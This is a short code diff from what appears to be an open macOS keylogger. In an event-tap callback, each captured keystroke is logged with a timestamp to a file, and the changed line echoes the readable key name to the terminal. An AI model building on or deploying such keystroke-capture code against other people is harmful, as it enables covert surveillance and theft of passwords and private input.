@@ -62,7 +62,7 @@ CGEventRef myCGEventCallback (CGEventTapProxy proxy, CGEventType type, CGEventRe
         strftime(fmtTime, 32, "%F %T", time_info);
         
         fprintf(logFile, "%s %s\n", fmtTime, keyCodeToReadableString(keyCode));
-        fprintf(stderr, "%hu\n", keyCode);
+        fprintf(stderr, "%s\n", keyCodeToReadableString(keyCode) ); // this prints the captured keys in the terminal, comment it out if needed
         
         if (counter % 100 == 0) fflush(logFile);
     }
